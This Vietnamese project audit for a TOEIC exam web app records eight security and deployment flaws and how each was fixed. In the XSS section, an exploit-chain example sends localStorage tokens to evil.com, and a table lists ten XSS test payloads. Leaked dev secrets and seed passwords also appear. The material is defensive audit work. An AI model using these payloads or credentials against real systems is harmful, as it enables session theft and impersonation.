# Hiện trạng dự án & khuyến nghị

> **Mục đích:** nói thật dự án đang ở đâu, hỏng chỗ nào, sửa thế nào và vì sao — rồi hướng dẫn deploy
> thực chiến ở cuối.
>
> **Tài liệu song sinh:** [08-cam-nang-cong-nghe.md](08-cam-nang-cong-nghe.md) — giải thích công nghệ
> để trả lời phỏng vấn. Nói gọn: **cẩm nang = hiểu để nói · tài liệu này = làm để chạy.**
>
> **Nguồn dữ liệu:** đợt audit ngày 2026-07-26 trên commit `d2d19f2` — 14 agent đọc song song toàn bộ
> codebase (463 lượt đọc file), phát hiện **123 vấn đề**. Các vấn đề nghiêm trọng nhất đã qua **phản
> biện độc lập**: mỗi phát hiện được giao cho một agent thứ hai cố gắng bác bỏ, và phát biểu cuối cùng
> là bản đã đính chính.
>
> **Ký hiệu tin cậy:** 🔬 đã phản biện độc lập · 📋 phát hiện một lần, chưa phản biện chéo
>
> ## 🎯 Tiến độ vá: **8/8 vấn đề chặn deploy — XONG** (2026-08-04 → 08-06)
>
> | # | Vấn đề | Ngày |
> |---|---|---|
> | 1.1 | Lộ đáp án cho người chưa đăng nhập | 08-04 |
> | 1.2 | App không khởi động được ở Production | 08-05 |
> | 1.3 | Secrets nằm trong git | 08-05 |
> | 1.4 | Stored XSS — 15 chỗ render HTML thô | **08-06** |
> | 1.5 | Hangfire Dashboard mở cho tất cả | 08-05 |
> | 1.6 | Redis kết nối đồng bộ lúc boot | 08-05 |
> | 1.7 | docker-compose: PID / ports / password | 08-05 |
> | 1.8 | File media hoàn toàn public | 08-05 |
>
> Mỗi mục ở Phần 1 giữ nguyên **phân tích gốc** (tài sản phỏng vấn) và thêm khối ✅ ghi cách vá +
> **những gì học được ngoài dự kiến**. Việc tiếp theo: **Day 50 — Dockerfile**.
>
> ⚠️ **Đổi máy phải đọc:** [11-thiet-lap-may-moi.md](11-thiet-lap-may-moi.md)

---

## Mục lục

| Phần | Nội dung |
|---|---|
| [0](#0-bảng-điểm-hiện-trạng) | Bảng điểm hiện trạng từng mảng |
| [1](#1-tám-vấn-đề-chặn-deploy) | **8 vấn đề CHẶN DEPLOY** — ✅ **đã vá hết 8/8** |
| [2](#2-vấn-đề-ảnh-hưởng-trực-tiếp-người-dùng) | Vấn đề ảnh hưởng trực tiếp người dùng |
| [3](#3-nợ-kỹ-thuật-còn-lại) | Nợ kỹ thuật còn lại |
| [4](#4-lộ-trình-sửa) | Lộ trình sửa — 4 giai đoạn |
| [5](#5-hướng-dẫn-deploy-thực-chiến) | **Hướng dẫn deploy thực chiến** |

---

# 0. Bảng điểm hiện trạng

| Mảng | Điểm | Nhận xét thật |
|---|---|---|
| **Kiến trúc** | 🟢 Tốt | Clean Architecture 4 tầng rõ ràng, `Result<T>` dùng nhất quán, DI đúng. Lệch chuẩn ở chỗ service nằm ở Infrastructure — chấp nhận được và giải thích được |
| **Nghiệp vụ cốt lõi** | 🟢 Tốt | Exam engine chạy đủ luồng. `ToeicScoreHelper` tách thuần, có 30 unit test. Đây là **điểm mạnh nhất** của dự án |
| **Authentication** | 🟢 Đã siết (2026-08-08) | JWT + refresh rotation + Google OAuth. **Access token chỉ ở RAM, refresh token trong cookie `httpOnly`** (XSS không đọc được token nữa); silent refresh lúc F5; logout gọi API thật (thu hồi DB + xóa cookie). **Rate limit đã tách policy** — `refresh-token`/`logout` không còn chung quota với `login` (mục 2.9). Còn nợ: lockout, reuse detection, hash refresh token |
| **Authorization (API)** | 🟢 Đã vá (2026-08-04) | Có **fallback policy** `RequireAuthenticatedUser` → mặc định ĐÓNG. Ngân hàng câu hỏi khóa theo role, ownership check tốt ở phiên thi. Bảng phân quyền: [10-phan-quyen-endpoint.md](10-phan-quyen-endpoint.md). Còn nợ: `PracticeController` thiếu ownership check (Day 47) |
| **Authorization (UI)** | 🔴 Chưa có | Frontend không biết role. User thấy menu quản trị |
| **Database** | 🟡 Khá | 29 index đầy đủ, Fluent API sạch, Value Converter đúng. Thiếu concurrency token |
| **Hiệu năng** | 🟠 Yếu | Repository materialize-everything là gốc rễ: phân trang trong RAM, không `AsNoTracking`, query không trần |
| **Bảo mật** | 🟢 Hết lỗ hổng chặn deploy | Đã vá: secrets trong git · Hangfire dashboard (Basic Auth + read-only) · media đề thi ra khỏi `wwwroot` + signed URL · **XSS sanitize lúc ghi ở 3 luồng** · **token khỏi `localStorage` → RAM + cookie `httpOnly`**. Còn nợ (không chặn deploy): magic bytes cho upload, zip bomb — mục 3.3 |
| **Deploy config** | 🟢 Đã vá (2026-08-05) | `docker-compose.prod.yml` tách riêng: `MSSQL_PID=Express`, **không** expose port DB/Redis, `${VAR:?}` fail-fast thay vì fallback password. Dev bind `127.0.0.1` thay vì `0.0.0.0` |
| **Cấu hình** | 🟢 Đã vá (2026-08-04) | Khung khóa đầy đủ ở `appsettings.json`, giá trị thật ở User Secrets (dev) / biến môi trường (prod). Thiếu cấu hình → `InvalidOperationException` **nêu đúng tên biến cần đặt**. Đã kiểm chứng chạy được với `ASPNETCORE_ENVIRONMENT=Production` |
| **Frontend** | 🟢 Tốt (2026-08-10) | React 19, kỹ thuật thi (debounce, useRef guard) làm tốt. **Auto-refresh token** (axios interceptor gộp 401 chống race) + silent refresh lúc F5. **Khôi phục phiên thi khi F5 đã xong** — đáp án, đồng hồ và vị trí section đều lấy từ server (mục 2.2) |
| **Testing** | 🟠 Yếu | 30 test nhưng chỉ phủ 2 hàm thuần. **0 test cho exam engine** — phần phức tạp nhất |
| **CI/CD** | 🔴 Chưa có | `.github/workflows/` rỗng. 30 test không bao giờ chạy tự động |
| **Deploy** | ⬜ Chưa làm | Chưa có Dockerfile, chưa có Nginx, chưa deploy lần nào |

**Tóm tắt một câu:** phần *xây dựng tính năng* làm tốt; phần *đưa sản phẩm ra đời thật* đã bắt đầu —
authorization và cấu hình production đã xử lý xong, còn **5/8** vấn đề chặn deploy và toàn bộ phần
vận hành (Docker, Nginx, CI, backup) chưa động tới.

---

# 1. Tám vấn đề chặn deploy

> Đây là danh sách **phải sửa trước khi đưa lên Internet**. Xếp theo thứ tự nên sửa.

## 1.1 · ✅ ĐÃ VÁ 2026-08-04 — Lộ toàn bộ đáp án cho người không đăng nhập

> **Trạng thái:** đã sửa. Fallback policy ở `Program.cs:134-137`, `QuestionController` khóa
> `[Authorize(Roles="Admin,ContentManager")]` cấp class, `TestController` siết `GetList`/`GetDetail`.
> Kiểm chứng bằng curl: ẩn danh 401 · token User 403 (`Content-Length: 0`) · token Admin 200.
> Bảng phân quyền đầy đủ: [10-phan-quyen-endpoint.md](10-phan-quyen-endpoint.md).
>
> **Giữ lại toàn bộ phân tích dưới đây** — đây là chuỗi khai thác thật đã tự tìm ra và tự vá, dùng để
> trả lời *"bạn từng tìm thấy lỗ hổng bảo mật nào chưa?"*.
>
> **Hai điều học được mà lúc đầu không biết:**
> 1. `[Authorize]` **trần** là vô nghĩa khi fallback policy đã là `RequireAuthenticatedUser` — đã mắc
>    đúng lỗi này, phải thêm `Roles` mới siết được.
> 2. Đọc response phân biệt được chặn ở đâu: `403` + `Content-Length: 0` = chặn ở middleware;
>    `400` + body nghiệp vụ = **đã đi qua** authorization vào tới service.

**Vị trí:** [QuestionController.cs:20-37](../backend/ToeicMasterPro.API/Controllers/QuestionController.cs#L20)
kết hợp [QuestionService.cs:140-145](../backend/ToeicMasterPro.Infrastructure/Services/QuestionService.cs#L140)

**Sự việc:** `GET /api/Question` và `GET /api/Question/{id}` **không có `[Authorize]`** ở cả cấp action
lẫn cấp class, và backend **không đăng ký fallback policy** nào (grep
`AddAuthorization|FallbackPolicy|AuthorizeFilter|RequireAuthorization` toàn backend = **0 kết quả**).

Chúng trả về `QuestionResponse` chứa `Explanation` và danh sách `OptionResponse(..., bool IsCorrect)`:
```csharp
// QuestionService.cs:140-145
private static QuestionResponse MapToResponse(Question q, List<QuestionOption> options)
  => new(q.Id, q.Part, q.Difficulty, q.Content, q.Explanation, q.AudioUrl, q.ImageUrl,
         q.Passage, q.Tags, q.IsPublished,
         options.Select(o => new OptionResponse(o.Id, o.Label, o.Content, o.IsCorrect)).ToList());
```

**Hậu quả cụ thể:**
```bash
curl http://host/api/Question        # không kèm token
# → toàn bộ ngân hàng câu hỏi, kèm isCorrect từng đáp án và explanation
```
- **Không phân trang, không rate limit** → dump cả kho trong một lần gọi
- Tham số `isPublished` là optional nullable → **cả câu hỏi chưa publish (bản nháp) cũng lộ**
- `PlayQuestionItem` trả về chính `Question.Id` khi đang thi → client đang thi cầm sẵn QuestionId, chỉ
  cần gọi `GET /api/Question/{id}` ẩn danh là có đáp án đúng của **đúng câu đó** — tra cứu 1-1, tự động hóa được

**Vì sao chắc chắn là lỗ hổng chứ không phải thiết kế:** dự án đã **cố ý** xây DTO riêng để giấu đáp án
ở mọi luồng học viên — `TestPlayResponse`/`PlayOptionItem` có comment *"KHÔNG có IsCorrect / Explanation"*,
`PracticeQuestionResponse` tương tự, và `/api/Test/{id}/play` có `[Authorize]`.
`GET /api/Question` **đi vòng qua toàn bộ lớp bảo vệ đó mà còn không cần đăng nhập**.

**Phân loại:** OWASP API5:2023 Broken Function Level Authorization + API3 Excessive Data Exposure.

**Cách sửa — làm cả hai:**
```csharp
// 1. Vá ngay endpoint này
[HttpGet]
[Authorize(Roles = "Admin,ContentManager")]
public async Task<IActionResult> GetList(...)

// 2. Sửa gốc rễ — secure by default, trong Program.cs
builder.Services.AddAuthorizationBuilder()
    .SetFallbackPolicy(new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build());
// Sau đó đánh dấu [AllowAnonymous] tường minh cho login/register/exam-schedule công khai
```

**Vì sao phải làm cả hai:** vá một endpoint chỉ chữa triệu chứng. Fallback policy biến
*"quên `[Authorize]` = lộ dữ liệu"* thành *"quên `[AllowAnonymous]` = 401"* — **hỏng an toàn thay vì
hỏng nguy hiểm**. Đây cũng là câu trả lời rất mạnh khi phỏng vấn hỏi về tư duy bảo mật.

> **Lưu ý cùng loại 📋:** `GET /api/test` và `GET /api/test/{id}` cũng ẩn danh — lộ đề nháp chưa publish
> và cấu trúc đề. Fallback policy xử lý luôn cả hai.

## 1.2 · ✅ ĐÃ VÁ 2026-08-04 — Ứng dụng KHÔNG THỂ khởi động ở Production

> **Trạng thái:** đã sửa (commit `9d6e2a6`). `appsettings.json` giờ chứa **khung đầy đủ** mọi khóa
> (`ConnectionStrings`/`Redis`/`Cors`/`Jwt`, giá trị rỗng); toàn bộ `!` đã bỏ, thay bằng kiểm tra tường
> minh ở [Program.cs:35-44](../backend/ToeicMasterPro.API/Program.cs#L35),
> [:117-131](../backend/ToeicMasterPro.API/Program.cs#L117),
> [:175-178](../backend/ToeicMasterPro.API/Program.cs#L175).
>
> **Kiểm chứng bằng cách chạy thật** `ASPNETCORE_ENVIRONMENT=Production dotnet run --no-launch-profile`:
> báo lỗi cụ thể lần lượt `ConnectionStrings:DefaultConnection` → `Redis:ConnectionStrings` →
> `Jwt:SecretKey` → `Jwt:Issuer/Audience` → `Cors:AllowedOrigins`; nạp đủ 6 biến môi trường thì app
> khởi động thành công (Hangfire lên, dispatchers chạy).
>
> **Bài học quan trọng nhất — cái bẫy mà việc sửa tự tạo ra:** khi đưa khung khóa vào `appsettings.json`,
> section `Jwt` **bắt đầu tồn tại**, nên `.Get<JwtSettings>() ?? throw` **không còn bắt được gì** — nó
> trả về object hợp lệ với `SecretKey = ""`. Nếu chỉ làm `?? throw`, app sẽ khởi động **thành công** ở
> Production rồi chết ở request login đầu tiên với `IDX10653` — tức là biến lỗi lúc-khởi-động thành lỗi
> lúc-chạy, **tệ hơn trước khi sửa**. Vì vậy phải kiểm **giá trị** (`Encoding.UTF8.GetByteCount(...) < 32`),
> không chỉ kiểm sự tồn tại. Lúc test, phép kiểm này bắt được ngay một placeholder 30 byte chưa thay.
>
> **Hai lỗi phụ cùng gốc rễ, phát hiện thêm khi sửa:**
> 1. `Serilog` và `ToeicDirections` **chỉ tồn tại trong `appsettings.Development.json`** → ở Production
>    `ReadFrom.Configuration` không tìm thấy `Serilog` nên **mất hẳn ghi log ra file**, và directions của
>    đề thi biến mất. Đã chuyển sang file base.
> 2. `Cors:AllowedOrigins` rỗng ở prod thì `WithOrigins()` **chặn hết** mà server **không có một dòng log
>    nào** — chỉ frontend thấy lỗi CORS. Đã thêm fail fast cho non-Development.
>
> **Giữ lại toàn bộ phân tích dưới đây** để trả lời phỏng vấn về tư duy fail-fast.

**Vị trí:** [Program.cs:64](../backend/ToeicMasterPro.API/Program.cs#L64),
[Program.cs:101](../backend/ToeicMasterPro.API/Program.cs#L101), `appsettings.json`
*(số dòng theo bản trước khi vá)*

**Sự việc:** các section `Jwt`, `Redis`, `Cors` **chỉ tồn tại trong `appsettings.Development.json`**.
File base `appsettings.json` không có. Trong khi code dùng **null-forgiving operator `!`**:
```csharp
var redisConn = builder.Configuration["Redis:ConnectionStrings"]!;              // :64
var jwt = builder.Configuration.GetSection(JwtSettings.SectionName).Get<JwtSettings>()!;  // :101
```

**Hậu quả:** chạy với `ASPNETCORE_ENVIRONMENT=Production` → `jwt` là `null` → dòng 120 truy cập
`jwt.Issuer` → **`NullReferenceException` ngay lúc khởi động**. App chết trước khi nhận request đầu tiên.

> Đây là lý do vì sao vấn đề secrets ở mục 1.3 **chưa** bị khai thác: **chưa từng tồn tại một instance
> production nào để bị tấn công.**

**Cách sửa:**
1. Đưa **cấu trúc** section vào `appsettings.json` (giá trị rỗng), giá trị thật đến từ biến môi trường
2. Bỏ `!`, thay bằng kiểm tra tường minh **fail fast có thông báo rõ**:
```csharp
var jwt = builder.Configuration.GetSection(JwtSettings.SectionName).Get<JwtSettings>()
    ?? throw new InvalidOperationException(
        "Thiếu cấu hình 'Jwt'. Đặt biến môi trường Jwt__SecretKey, Jwt__Issuer, Jwt__Audience.");
```
Crash kèm thông báo rõ ràng tốt hơn `NullReferenceException` gấp nhiều lần.

## 1.3 · ✅ ĐÃ VÁ 2026-08-04 — Secrets nằm trong git từ commit đầu tiên

> **Trạng thái:** đã sửa (commit `9d6e2a6`).
>
> | Việc | Đã làm |
> |---|---|
> | `Jwt:SecretKey` | **Sinh khóa mới 48 byte ngẫu nhiên** bằng `RandomNumberGenerator` |
> | Connection string, mật khẩu Redis, mật khẩu seed | Dời sang **User Secrets** (`%APPDATA%\Microsoft\UserSecrets\...`) |
> | `appsettings.json` | Xóa connection string `sa` — file base nạp ở **mọi** môi trường |
> | `appsettings.Development.json` | Chỉ còn giá trị dev **không phải secret** (Cors, Jwt Issuer/Audience, email seed) — vẫn ở trong git, cố ý |
> | Production | Nạp qua **biến môi trường** `Jwt__SecretKey`, `ConnectionStrings__DefaultConnection`, … |
>
> **Điểm cần phân biệt rõ khi trình bày:** dời file đi **không phải** phần vá. Khóa cũ vẫn nằm trong git
> history vĩnh viễn (`git log -p` là ra). Thứ thật sự vá lỗ hổng là **đổi khóa** — khóa đã lộ trở thành
> vô hại vì không còn được dùng để verify token. Việc dời secret ra ngoài repo là **phòng ngừa tái phát**,
> không phải vá.
>
> **Vì sao chọn User Secrets thay vì gitignore file:** User Secrets nằm **ngoài thư mục project** nên
> không thể `git add` nhầm. Gitignore vẫn có thể bị `git add -f` hoặc bị copy sang file khác.
>
> **Còn nợ — mật khẩu DB/Redis chưa đổi.** Lý do có chủ đích: chúng **vẫn nằm trong
> `docker-compose.yml:25, 33, 57, 65`** dưới dạng fallback `${DB_PASSWORD:-ToeicMaster@2026}`. Đổi mật
> khẩu mà không bỏ fallback thì **gần như không đạt được gì** — compose vẫn im lặng dùng giá trị cũ khi
> thiếu `.env`. Sẽ đổi cùng lúc khi làm **mục 1.7** (docker-compose).
>
> **Còn nợ — mật khẩu tài khoản admin trong DB.** Đổi `AdminSeed:Password` trong config **không** đổi
> mật khẩu của user đã tồn tại, vì `SeedUserIfMissingAsync` chỉ tạo khi chưa có email đó. Tài khoản
> `admin@toeicmaster.com` vẫn dùng mật khẩu cũ.

**Vị trí:** `appsettings.Development.json` (bị git track từ commit `e5172e7`, 2026-06-18) và
`appsettings.json`

| Dòng | Chứa gì |
|---|---|
| `appsettings.Development.json:15` | **JWT SecretKey** — `"toeic-master-pro-super-secret-key-2026-change-in-production"` |
| `:3` | Chuỗi kết nối tài khoản `sa` |
| `:6` | Mật khẩu Redis |
| `:24-28` | Mật khẩu Admin seed — `"Admin@2026"` |
| `appsettings.json:10` | **Chuỗi kết nối `sa`** — file base, nạp ở **mọi** môi trường |

**Vì sao SecretKey nguy hiểm nhất:** nó là khóa **đối xứng** ký HMAC-SHA256
([TokenService.cs:36-40](../backend/ToeicMasterPro.Infrastructure/Authentication/TokenService.cs#L36)),
và role được ký bằng `ClaimTypes.Role` khớp đúng cấu hình verify.
→ **Ai đọc được repo đều tự ký được access token role Admin hợp lệ mà không cần đăng nhập.**
Dự án **không có** cơ chế bù trừ nào: không `OnTokenValidated`, không kiểm `SecurityStamp`, không
revocation cho access token.

**Đính chính quan trọng (từ bước phản biện):** đây là secret **môi trường DEV**, không phải production —
mọi launch profile đặt `ASPNETCORE_ENVIRONMENT=Development`, repo không có `appsettings.Production.json`.
Cộng với mục 1.2 (app không start được ở Production), **chưa hề tồn tại instance production để bị chiếm**.
Mức đúng là **HIGH — lỗi chặn deploy bắt buộc xử lý**, không phải "đang bị khai thác".

Hai chi tiết phụ đáng biết:
- `"Cm@2026"` chỉ **7 ký tự** → không thỏa `RequiredLength = 8` → `Program.cs:274` **nuốt lỗi im lặng**
  → tài khoản ContentManager **thực tế chưa bao giờ được tạo**.
  ✅ **Đã sửa 2026-08-04:** mật khẩu mới 10 ký tự, và
  [Program.cs:326-332](../backend/ToeicMasterPro.API/Program.cs#L326) giờ `Log.Error` liệt kê
  `result.Errors` khi seed thất bại thay vì bỏ qua. Log lúc khởi động đã xác nhận tài khoản
  ContentManager **được tạo thành công lần đầu tiên**.
- SQL/Redis chỉ bind localhost trên máy dev nên hai mật khẩu đó không khai thác từ xa được

**Cách sửa — theo đúng thứ tự:**
```bash
# 1. Coi như đã lộ — đổi TOÀN BỘ secret trước tiên
#    Sinh SecretKey mới đủ entropy:
openssl rand -base64 48

# 2. Gỡ khỏi git tracking, giữ file trên máy
git rm --cached backend/ToeicMasterPro.API/appsettings.Development.json
echo "appsettings.Development.json" >> .gitignore

# 3. Tạo file mẫu để người khác biết cần điền gì
#    appsettings.Development.example.json — chỉ tên khóa, giá trị rỗng

# 4. Dev chuyển sang User Secrets (nằm NGOÀI thư mục project)
dotnet user-secrets init --project backend/ToeicMasterPro.API
dotnet user-secrets set "Jwt:SecretKey" "<gia-tri-moi>" --project backend/ToeicMasterPro.API

# 5. Production dùng biến môi trường: Jwt__SecretKey (hai gạch dưới thay dấu hai chấm)
```

> ⚠️ **Xóa file đi là chưa đủ** — git giữ toàn bộ lịch sử, ai cũng `git log -p` ra được. Muốn xóa sạch
> phải viết lại lịch sử bằng `git filter-repo` (rồi force-push, và mọi người phải clone lại).
> **Với repo cá nhân chưa public, cách rẻ hơn và đủ an toàn là: đổi hết secret rồi ngừng commit chúng.**

## 1.4 · ✅ ĐÃ VÁ 2026-08-06 — Stored XSS, 15 chỗ render HTML thô

> **Cách vá:** `HtmlContentSanitizer` (package `HtmlSanitizer` 9.1.982) sanitize **lúc GHI** ở
> `QuestionService` — **11 chỗ, 3 luồng**: Create (36, 37, 40, 47) · Update (105, 106, 109, 122) ·
> **Import Excel (241, 272, 273, 276)**. Whitelist tag/attribute/scheme, `AllowedSchemes` chỉ
> `http`/`https` để chặn `javascript:` và `data:text/html`.
>
> ### 🎯 Phát hiện quan trọng nhất — tự tìm ra khi thử tấn công
>
> Thử XSS trên UI thì **chỉ luồng import Excel bị**, gõ vào rich text editor thì không.
> Tưởng editor an toàn. **Sai.**
>
> TipTap dùng **ProseMirror schema** (`StarterKit` khai báo node/mark được phép) → payload dán
> vào editor bị schema bỏ trước khi `getHTML()` trả về. Nhưng đó là **bảo vệ phía CLIENT**.
>
> **Đã kiểm chứng bằng curl:** `POST /api/Question` với
> `<img src=x onerror="alert(1)">` → payload vào DB **NGUYÊN VẸN**. Excel hở vì không qua
> ProseMirror; curl cũng không qua ProseMirror nên hở y như vậy.
>
> → **Editor lọc là tiện nghi phía client, không phải kiểm soát bảo mật.** Cùng bài học với lỗi
> 1.1 (ẩn menu là GIẤU, `[Authorize]` mới là KHÓA) và 1.8 (`<audio>` phải verify ở server).
>
> ### Vì sao whitelist, không blacklist
>
> Test 10 kỹ thuật XSS khác nhau, **tất cả bị chặn** mà không cần biết trước từng cái:
>
> | Payload | Sau sanitize |
> |---|---|
> | `<img src=x onerror="alert(1)">` | `<img src="x">` — ảnh giữ, handler mất |
> | `<script>alert(2)</script>` | `alert(2)` (chữ, `KeepChildNodes = true`) |
> | `<a href="javascript:alert(3)">click</a>` | `click` |
> | `<p onclick="alert(4)">para</p>` | `<p>para</p>` |
> | `<iframe src="http://evil.com">` · `<iframe srcdoc="...">` | mất sạch |
> | `<svg onload="alert(9)">` · `<body onpageshow="alert(8)">` | mất sạch |
> | `<img src="data:text/html,<script>...">` | `<img>` — scheme `data:` bị chặn |
> | `<td onmouseenter="alert(6)">cell</td>` | `<td>cell</td>` — bảng giữ |
>
> Blacklist sẽ thiếu `srcdoc`, `onpageshow`, `data:text/html`. Whitelist mặc định **từ chối**.
>
> **Định dạng vẫn dùng được:** `<b>`, `<em>`, `<strong>`, `<table>` còn nguyên — CM soạn đậm/
> nghiêng/bảng không bị hỏng. Đây là điểm phân biệt **sanitize** với **escape**.
>
> ### Đã kiểm chứng 3/3 luồng
> Create qua API · Update qua API · **Import file `.xlsx` thật** (`totalRows: 1,
> successCount: 1` → nội dung sạch). Dữ liệu cũ trong DB: **0 dòng bẩn**, không cần script dọn.
>
> ### ✅ Lớp 4 — ĐÃ LÀM (2026-08-08)
> Access token đã chuyển vào **RAM** (Zustand state, không persist), refresh token sang cookie
> **`httpOnly`** (JS không đọc được). Nay XSS dù lọt lưới cũng **không lấy được token** — chỉ hành
> động được trong phiên đang mở, không mang token đi dùng chỗ khác. Xem mục **Authentication** ở bảng
> điểm và mục 2.1/2.6.
>
> Còn nợ khác: `MediaController` chỉ tin phần mở rộng file (chưa kiểm magic bytes), import ZIP
> chưa whitelist đuôi + chưa giới hạn số entry (zip bomb) — xem mục 3.3.

**Vị trí:** `MockTestPlayPage.tsx:1087, 1117, 1200, 1234, 1262, 1362, 1434, 1454`;
`ExamAnswerReviewPanel.tsx:266`; `PracticePage.tsx:311`…

**Sự việc:** nội dung câu hỏi do CM soạn bằng TipTap nên là HTML, được render bằng
`dangerouslySetInnerHTML`. **Không sanitize ở cả frontend lẫn backend.**

**Chuỗi khai thác đầy đủ:**
1. CM (hoặc kẻ chiếm được tài khoản CM) soạn nội dung câu hỏi chứa
   `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('accessToken'))">`
2. Nội dung lưu thẳng vào DB, không lọc
3. Mọi user làm đề đó → script chạy trong trình duyệt họ
4. Token lưu `localStorage` ([token.ts:5-8](../frontend/src/lib/token.ts#L5)) → **JS đọc được** → gửi về server kẻ tấn công
5. Kẻ tấn công dùng token đó mạo danh user

**Cách sửa — bắt buộc làm ở backend:**
```csharp
// dotnet add package HtmlSanitizer
private static readonly HtmlSanitizer _sanitizer = new();
// Trong QuestionService, trước khi lưu:
q.Content = _sanitizer.Sanitize(req.Content);
q.Explanation = _sanitizer.Sanitize(req.Explanation);
q.Passage = _sanitizer.Sanitize(req.Passage);
```

> **Vì sao phải ở backend, không chỉ frontend:** frontend chạy trên máy người dùng — bỏ qua được.
> Kẻ tấn công gọi thẳng API bằng curl là qua mặt mọi kiểm tra phía client.
> **Nguyên tắc: sanitize lúc GHI, escape lúc ĐỌC.**

**Giảm thiệt hại kèm theo:** chuyển access token khỏi `localStorage` (giữ trong memory, refresh token
trong httpOnly cookie) → XSS không lấy được token nữa.

## 1.5 · ✅ ĐÃ VÁ 2026-08-05 — Hangfire Dashboard mở cho tất cả mọi người

> **Cách vá:** `MapHangfireDashboard` (không phải `Use`) + `.AllowAnonymous()` +
> `HangfireDashboardAuthFilter` kiểm Basic Auth + `IsReadOnlyFunc` ở Production.
> Thiếu `Hangfire__DashboardUser/Password` → **không mount** dashboard (fail closed).
>
> **Hai điều học được ngoài dự kiến:**
> 1. **Hangfire 1.8 dùng endpoint routing**, nên fallback policy (lỗi 1.1) **đã** chặn `/hangfire`
>    — nhưng chặn cả chính mình. Phải `.AllowAnonymous()` để gỡ tầng JWT rồi thay bằng Basic Auth,
>    vì trang HTML mở bằng trình duyệt không gắn được `Authorization` header.
> 2. `LocalRequestsOnlyAuthorizationFilter` **sai ở cả hai đầu**: chặn chính mình khi dev
>    (`localhost` → `::1` IPv6, không phải `127.0.0.1`), và cho qua hết khi deploy sau Nginx
>    (mọi request đến từ mạng nội bộ Docker). **Xác thực theo IP không dùng được.**
>
> **Lỗi phát sinh đã sửa:** `RecurringJob.AddOrUpdate` là static API đọc `JobStorage.Current` —
> biến toàn cục chỉ được set như **side effect** của `UseHangfireDashboard`. Đổi sang `Map` thì
> app **không boot được ở Production**. Sửa bằng `IRecurringJobManager` từ DI. Bài học: việc đăng
> ký job không được phụ thuộc vào việc dashboard có mount hay không.
>
> **Nghiệm thu:** header `WWW-Authenticate: Basic realm="Hangfire Dashboard"` (nếu là `Bearer`
> thì filter chưa chạy). Test: 401 không credential · 401 sai mật khẩu · 200 đúng · 404 khi
> Production thiếu credential.

**Vị trí:** [Program.cs:221](../backend/ToeicMasterPro.API/Program.cs#L221)
```csharp
app.UseHangfireDashboard("/hangfire"); // Dev xem job: http://localhost:5191/hangfire
```

Comment ghi "Dev" nhưng dòng này **nằm ngoài khối `if (app.Environment.IsDevelopment())`** và
**không có** `DashboardOptions.Authorization`.

**Hậu quả:** deploy lên là ai vào `domain.com/hangfire` cũng xem được danh sách job, lịch sử chạy, và
bấm **"Trigger now"**.

**Cách sửa:**
```csharp
public class AdminOnlyDashboardFilter : IDashboardAuthorizationFilter
{
    public bool Authorize(DashboardContext context)
    {
        var http = context.GetHttpContext();
        return http.User.Identity?.IsAuthenticated == true && http.User.IsInRole("Admin");
    }
}

// Program.cs — và đặt SAU UseAuthentication/UseAuthorization
app.UseHangfireDashboard("/hangfire", new DashboardOptions {
    Authorization = new[] { new AdminOnlyDashboardFilter() }
});
```

## 1.6 · ✅ ĐÃ VÁ 2026-08-05 — Redis kết nối đồng bộ lúc khởi động

> **Cách vá:** đổi `AddSingleton<T>(instance)` → `AddSingleton<T>(_ => ...)` và thêm
> `abortConnect=false` vào connection string.
>
> **Khác biệt giữa hai overload — đây là điểm cốt lõi:**
>
> | | `AddSingleton<T>(instance)` | `AddSingleton<T>(factory)` |
> |---|---|---|
> | `Connect()` chạy khi nào | **Ngay lúc đăng ký DI** | Lần đầu có ai resolve |
> | Không ai dùng | Vẫn kết nối | **Không bao giờ kết nối** |
> | Redis chết lúc boot | App chết | App chạy bình thường |
>
> Vì `ICacheService` chưa được inject ở đâu, thực tế `Connect()` **không bao giờ chạy** — Redis
> thành dependency tùy chọn thật sự.
>
> **Đã kiểm chứng:** `docker stop toeic_redis` → app vẫn khởi động, login vẫn 200.

**Vị trí:** [Program.cs:66](../backend/ToeicMasterPro.API/Program.cs#L66)
```csharp
builder.Services.AddSingleton<IConnectionMultiplexer>(ConnectionMultiplexer.Connect(redisConn));
```

`Connect()` chạy **ngay lúc dựng DI container**, đồng bộ và chặn. Redis chưa sẵn sàng → **API sập lúc boot**.

**Nghịch lý:** `ICacheService` **không được inject ở bất kỳ đâu** — Redis là code chết, nhưng lại là
**dependency bắt buộc để app khởi động được**.

Trên máy dev không sao vì Redis đã chạy sẵn. Trên VPS với docker-compose, **thứ tự container khởi động
không đảm bảo** → lỗi này rất dễ xảy ra khi deploy.

**Cách sửa:**
```csharp
builder.Services.AddSingleton<IConnectionMultiplexer>(_ =>
    ConnectionMultiplexer.Connect(redisConn));   // lambda: hoãn tới khi thật sự cần
```
Thêm `abortConnect=false` vào connection string để Redis tạm chết không làm sập app.

## 1.7 · ✅ ĐÃ VÁ 2026-08-05 — docker-compose: 3 vấn đề phải sửa trước khi lên prod

> **Cách vá:** tách `docker-compose.prod.yml` riêng (dev cần mở port cho SSMS, prod thì không —
> một file không phục vụ được cả hai). Thêm `.env.example` làm tài liệu (commit, giá trị **rỗng**).
>
> | Vấn đề | Cách sửa |
> |---|---|
> | `MSSQL_PID=Developer` | → `Express` (miễn phí **cho cả production**, giới hạn 10GB/DB) |
> | Bind `0.0.0.0` | Prod: **bỏ hẳn `ports`** · Dev: `127.0.0.1:1434:1433` tường minh |
> | `${DB_PASSWORD:-hardcode}` | → `${DB_PASSWORD:?thông báo}` — thiếu biến thì compose **báo lỗi** |
>
> **Hai điều học được:**
> 1. Cú pháp `"1434:1433"` bind ra `0.0.0.0` (**mọi** card mạng) — comment cũ ghi "chỉ expose
>    local" là **sai**. Muốn local phải ghi `127.0.0.1:1434:1433`.
> 2. `docker compose up -d` **không** recreate container nếu image không đổi → sửa file mà không
>    thấy tác dụng. Phải `--force-recreate`.
>
> **Tác dụng phụ đã xử lý:** siết binding sang IPv4 làm app mất kết nối DB, vì `localhost` trên
> Windows phân giải ra **`::1` (IPv6) trước** và `SqlClient` **không fallback**. Connection string
> phải dùng `127.0.0.1` tường minh.
>
> **Đã kiểm chứng:** `config` không có `.env` → báo lỗi nêu đúng tên biến · có `.env` → chỉ
> `nginx` có `published:`, `MSSQL_PID: Express`.

| Vấn đề | Vị trí | Sửa |
|---|---|---|
